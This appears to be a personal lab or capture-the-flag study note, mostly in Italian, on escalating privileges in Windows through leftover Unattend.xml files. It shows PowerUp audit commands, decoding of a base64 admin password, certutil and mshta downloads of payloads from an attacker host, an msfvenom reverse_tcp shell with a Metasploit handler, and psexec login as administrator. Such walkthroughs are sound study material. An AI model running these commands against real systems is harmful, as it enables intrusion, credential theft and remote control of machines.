Windows può automatizzare una serie di attività ripetitive, come l'implementazione di massa o
installazione di Windows su molti sistemi.
● Questa operazione viene in genere eseguita mediante l'utilizzo dell'utilità Installazione automatica di Windows,
che viene utilizzato per automatizzare l'installazione/distribuzione di massa di Windows on
sistemi.
● Questo strumento utilizza file di configurazione che contengono configurazioni e utenti specifici
credenziali dell'account, in particolare la password dell'account amministratore.
● Se i file di configurazione dell'installazione automatica di Windows vengono lasciati sulla destinazione sistema dopo l'installazione, possono rivelare le credenziali dell'account utente che possono essere utilizzato dagli aggressori per autenticarsi legittimamente con la destinazione Windows.

L'utilità di installazione automatica di Windows utilizza in genere uno dei seguenti
file di configurazione che contengono l'account utente e la configurazione del sistema
informazione (solitamente password sono memorizzate in base64):
-  C:\Windows\Panther\Unattend.xml
-  C:\Windows\Panther\Autounattend.xml


#### PowerShell & PowerSploit
Utilizzo alcuni Moduli Powershell per ottenere e scoprire "unattended files", ossia file di confiugrazioni presenti sul sistema come "Unattend.xml" file.

```

### PowerShell - PowerSploit:
PowerSploit è una raccolta di moduli Microsoft PowerShell che possono essere utilizzati per facilitare la penetrazione tester durante tutte le fasi di una valutazione. PowerSploit comprende i seguenti moduli e script come #PowerUp.ps1


# PowerSploit - PowerUp.ps1:
PowerUp mira a essere un punto di raccolta dei comuni vettori di escalation dei privilegi di Windows che si basano su configurazioni errate.
Source: https://github.com/PowerShellMafia/PowerSploit 


# Powersploit - Run PowerUp.ps1 to Find Privilege Escalation:
> Powershell.exe 
> cd .\Desktop\PowerSploit\Privesc\ 
> ls
[Get-System.ps1]
[PowerUp.ps1]
[Privesc.psd1]
[Privesc.psm1]


# Powersploit - Import PowerUps.ps1 script + Invoke-PrivescAudit function
> powershell -ep bypass Windows Powershell
> . .\PowerUp.ps1
> Invoke-PrivescAudit
[Unattend Path C: \Windows\Panther\Unattend.xml]
[Unattend File C: \Windows\Panther\Unattend.xml]

Discover Password in the .xml file (solitamente base64): "QWRtaW5AMTIz".

## Linux Base64 Decode
> echo QWRtaW5AMTIz | base64 -d
[Admin@123]

## Windows Base64 Decode:
> $passwd='QWRtaW5AMTIz'
> $passwd=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($pa sswd))
> echo $passwd
[Admin@123]


# High Privilege
> runas.exe /user:administrator cmd
[Enter the password:] QWRtaW5AMTIz


# Running Hta_server Module (HTA HTML Application) to gain meterpreter shell from Windows Machine:
msfconsole -q 
use exploit/windows/misc/hta_server 
exploit
[Payload HTA: http://10.10.0.2:8080/6Nz7aySfPN.hta]


# Execute Payload and Running from Host Windows Machine
> mshta.exe http://10.10.0.2:8080/6Nz7aySfPN.hta
```



```
Searching for Password in Windows Configuration Files

Unattended WindowsSetup: 
> C:\\Windows\Panther\Unattend.xml 
> C:\Windows\Panther\Autounattend.xml  

Solitamente queste due directory contengono passowrd o system configuration information utilizzate per i setup di configurazione di vari tools

Msfvenom - Create Payload
> msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.4.2 LPORT=1234 -f exe > payload.exe

Setup Web Server - and host the payload
> python -m SimpleHTTPServer 80

Certutil - Download the file to victim machine using Certutil
> certutil -urlcache -f http://10.10.4.2/payload.exe payload.exe

> msfconsole -q
use multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LPORT 1234
set LHOST 10.10.4.2
run

Execute the payload.exe on the Win target system and check the reverse shell on Kali.
> cd C:\\Windows\\Panther
> download unattend.xml
open the unattend.xml file - found the admin password with base64 encode
Decode the password

Test the administrator:Admin@123root credentials with the psexec tool
> psexec.py administrator@10.4.19.9
> cd C:\Users\Administrator\Desktop
> type flag.txt

```